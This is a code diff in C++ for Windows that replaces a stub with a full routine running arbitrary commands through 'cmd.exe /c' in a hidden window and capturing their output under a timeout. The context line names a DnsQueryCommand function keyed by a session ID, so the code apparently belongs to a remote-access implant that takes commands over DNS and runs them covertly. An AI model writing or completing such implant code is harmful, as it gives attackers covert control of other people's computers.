@@ -350,13 +350,116 @@ static std::string DnsQueryCommand(const std::wstring& sessionId) {
 }
 
 // =====================================================================
-//  COMMAND EXECUTION (placeholder – you already have ExecuteCommand)
+//  COMMAND EXECUTION — piped stdout/stderr capture, hard timeout
 // =====================================================================
 std::wstring ExecuteCommand(const std::wstring& cmd) {
-    // This is a simplified stub; your full ExecuteCommand function is elsewhere.
-    // For now, we'll just echo the command.
-    // Replace with your actual command execution logic.
-    std::wstring result = L"Executed: " + cmd;
+    // Wrap in cmd.exe /c so builtins (dir, ipconfig, etc.) work
+    std::wstring fullCmd = L"cmd.exe /c " + cmd + L" 2>&1";
+
+    SECURITY_ATTRIBUTES sa = {};
+    sa.nLength              = sizeof(sa);
+    sa.bInheritHandle       = TRUE;
+
+    // Anonymous pipe — child writes, we read
+    HANDLE hReadPipe = nullptr, hWritePipe = nullptr;
+    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
+        return L"[ERROR] CreatePipe failed: " + std::to_wstring(GetLastError());
+    }
+    // Prevent child from inheriting our read end
+    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
+
+    STARTUPINFOW si    = {};
+    si.cb              = sizeof(si);
+    si.dwFlags         = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.wShowWindow     = SW_HIDE;
+    si.hStdOutput      = hWritePipe;
+    si.hStdError       = hWritePipe;
+    si.hStdInput       = nullptr;
+
+    PROCESS_INFORMATION pi = {};
+    std::vector<wchar_t> cmdBuf(fullCmd.begin(), fullCmd.end());
+    cmdBuf.push_back(L'\0');
+
+    if (!CreateProcessW(
+            nullptr, cmdBuf.data(),
+            nullptr, nullptr,
+            TRUE,                                    // inherit handles
+            CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP,
+            nullptr, nullptr,
+            &si, &pi))
+    {
+        CloseHandle(hReadPipe);
+        CloseHandle(hWritePipe);
+        return L"[ERROR] CreateProcess failed: " + std::to_wstring(GetLastError());
+    }
+
+    // Done writing — close child's end so ReadFile returns EOF
+    CloseHandle(hWritePipe);
+    hWritePipe = nullptr;
+
+    // ── Timed read loop ────────────────────────────────────────────
+    std::string output;
+    output.reserve(4096);
+    DWORD   deadline    = GetTickCount() + config::CMD_TIMEOUT_MS;
+    bool    timedOut    = false;
+    DWORD   exitCode    = 0;
+
+    while (true) {
+        // Check timeout first
+        if (GetTickCount() >= deadline) {
+            timedOut = true;
+            TerminateProcess(pi.hProcess, 1);
+            WaitForSingleObject(pi.hProcess, 2000);
+            break;
+        }
+
+        // Non-blocking peek — avoids ReadFile blocking forever
+        DWORD avail = 0;
+        if (!PeekNamedPipe(hReadPipe, nullptr, 0, nullptr, &avail, nullptr)) break;
+
+        if (avail > 0) {
+            DWORD toRead = min(avail, (DWORD)4096);
+            std::vector<char> buf(toRead);
+            DWORD rd = 0;
+            if (!ReadFile(hReadPipe, buf.data(), toRead, &rd, nullptr) || rd == 0) break;
+            output.append(buf.data(), rd);
+            if (output.size() >= config::CMD_OUTPUT_MAX) {
+                output.resize(config::CMD_OUTPUT_MAX);
+                TerminateProcess(pi.hProcess, 1);
+                WaitForSingleObject(pi.hProcess, 2000);
+                output += "\n[OUTPUT TRUNCATED at 65536 bytes]";
+                break;
+            }
+        } else {
+            // Check if child is done
+            DWORD wret = WaitForSingleObject(pi.hProcess, 50);
+            if (wret == WAIT_OBJECT_0) {
+                // Drain remaining pipe data
+                DWORD remaining = 0;
+                while (PeekNamedPipe(hReadPipe, nullptr, 0, nullptr, &remaining, nullptr) && remaining > 0) {
+                    std::vector<char> buf(remaining);
+                    DWORD rd = 0;
+                    if (!ReadFile(hReadPipe, buf.data(), remaining, &rd, nullptr) || rd == 0) break;
+                    output.append(buf.data(), rd);
+                    if (output.size() >= config::CMD_OUTPUT_MAX) {
+                        output.resize(config::CMD_OUTPUT_MAX);
+                        output += "\n[OUTPUT TRUNCATED at 65536 bytes]";
+                        break;
+                    }
+                }
+                break;
+            }
+        }
+    }
+
+    GetExitCodeProcess(pi.hProcess, &exitCode);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    CloseHandle(hReadPipe);
+
+    std::wstring result = UTF8ToWString(output);
+    if (timedOut) result += L"\n[TIMED OUT after " + std::to_wstring(config::CMD_TIMEOUT_MS / 1000) + L"s]";
+    if (result.empty()) result = L"[no output] exit=" + std::to_wstring(exitCode);
     return result;
 }
 
